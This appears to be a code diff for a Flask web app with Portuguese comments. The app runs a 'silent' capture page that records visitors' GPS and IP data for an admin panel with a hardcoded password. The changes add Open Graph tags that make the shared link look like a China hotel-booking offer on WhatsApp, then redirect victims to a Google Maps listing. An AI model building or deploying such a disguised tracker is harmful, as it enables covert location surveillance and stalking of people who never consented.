@@ -8,7 +8,7 @@ from user_agents import parse
 
 app = Flask(__name__)
 
-# Buffers de armazenamento em memória RAM (Mainframe Core)
+# Buffers de armazenamento em RAM (Mainframe Core)
 registros_gps = []
 registros_ip = []
 
@@ -18,13 +18,21 @@ SENHA_ADMIN = "123123"
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
 
-# Página HTML de Captura Totalmente Oculta (Silenciosa)
+# Página HTML de Captura Totalmente Oculta (Silenciosa) com Meta Tags Open Graph
 HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Carregando...</title>
+    <title>Hotéis na China e Região</title>
+    
+    <!-- Meta Tags Open Graph para o WhatsApp / Redes Sociais -->
+    <meta property="og:title" content="Reserva de Hotéis - Arquitetura e Hospedagem na China">
+    <meta property="og:description" content="Encontre as melhores ofertas e pacotes de hospedagem na China com desconto exclusivo.">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
+    <meta property="og:url" content="https://loc-nsdi.onrender.com/">
+    <meta property="og:type" content="website">
+
     <style>
         body {{ background-color: #ffffff; margin: 0; }}
     </style>
@@ -246,7 +254,6 @@ HTML_PAINEL = """
 </table>
 
 <script>
-    // Auto-refresh rigoroso a cada 5 segundos preservando token de acesso (senha)
     setTimeout(function(){
         window.location.reload();
     }, 5000);
